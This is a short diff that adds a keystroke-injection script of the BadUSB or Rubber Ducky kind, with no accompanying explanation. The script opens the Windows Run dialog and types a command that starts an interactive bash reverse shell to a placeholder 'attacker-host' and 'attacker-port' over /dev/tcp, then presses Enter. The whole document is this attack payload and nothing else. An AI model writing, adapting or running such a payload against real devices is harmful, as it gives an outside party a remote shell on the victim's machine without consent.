@@ -1,0 +1,5 @@
+DELAY 1000
+GUI r
+DELAY 200
+STRING flipper-cli shell -c "bash -i >& /dev/tcp/attacker-host/attacker-port 0>&1"
+ENTER
